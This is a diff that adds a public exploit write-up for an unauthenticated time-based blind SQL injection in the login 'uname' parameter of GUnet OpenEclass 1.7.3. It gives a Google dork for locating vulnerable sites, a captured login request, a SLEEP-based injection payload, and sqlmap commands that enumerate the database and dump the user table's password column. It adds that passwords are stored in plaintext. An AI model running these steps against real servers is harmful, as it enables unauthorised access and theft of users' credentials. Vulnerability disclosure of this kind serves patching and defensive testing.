@@ -1,0 +1,72 @@
+# Exploit Title: GUnet OpenEclass E-learning platform 1.7.3 - 'uname' SQL Injection
+# Google Dork: intext:"© GUnet 2003-2007" 	
+# Date: 2019-11-03
+# Exploit Author: emaragkos 
+# Vendor Homepage: https://www.openeclass.org/
+# Software Link: http://download.openeclass.org/files/1.7/eclass-1.7.3.tar.gz
+# Version: 1.7.3 (2007)
+# Tested on: Ubuntu 12 (Apache 2.2.22, PHP 5.3.10, MySQL 5.5.38)
+# CVE : -
+# GUnet OpenEclass <= 1.7.3 E-learning platform - Unauthenticated Blind SQL Injection
+
+You can confirm applications' version by visiting https://URL/info/about.php
+Versions prior to 1.7.3 might also by vulnerable but were not tested.
+
+Source code:
+http://download.openeclass.org/files/1.7/eclass-1.7.3.zip
+http://download.openeclass.org/files/1.7/eclass-1.7.3.tar.gz
+
+Setup instructions:
+http://download.openeclass.org/files/docs/1.7/Install.pdf
+
+Changelog:
+https://download.openeclass.org/files/docs/1.7/CHANGES.txt
+
+Manual:
+https://download.openeclass.org/files/docs/1.7/eClass.pdf
+
+############################################################################
+
+Vulnerability: Post parameter (uname) is vulnerable to time-based blind SQLi 
+
+############################################################################
+
+Steps to reproduce:
+
+1) Visit vulnerable webapp and confirm version is <= 1.7.3 https://URL/info/about.php
+
+2) Configure Burp proxy to intecrept and to capture a login sequence with invalid username/password. (e.g. username:test password:test)
+Your request should look like this:
+POST / HTTP/1.1
+Host: 192.168.1.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.8/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Connection: close
+Cookie: PHPSESSID=d6gupmerbr0k84st4d7qv9jsl1
+Upgrade-Insecure-Requests: 1
+uname=test&pass=test&submit=%C5%DF%F3%EF%E4%EF%F2
+
+3) Save intercepted request as a file (Right click -> Copy to file -> Save as eclasstestlogin)
+
+4) Load the file to SQLMap  with the use of -r parameter
+sqlmap -r eclasstestlogin --level=5 --risk=3 -v
+SQLMap will find the following payload
+---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test' AND (SELECT 5551 FROM (SELECT(SLEEP(5)))IZsi)-- aLyD&pass=test&submit=%C5%DF%F3%EF%E4%EF%F2
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+
+5) Exploit it!
+sqlmap -r eclasstestlogin -v --current-db
+sqlmap -r eclasstestlogin -v -D [DB-NAME-GOES-HERE] --dump
+sqlmap -r eclasstestlogin -v -D [DB-NAME-GOES-HERE] -T user -C password --dump
+
+6) Bonus! Passwords are stored in plaintext
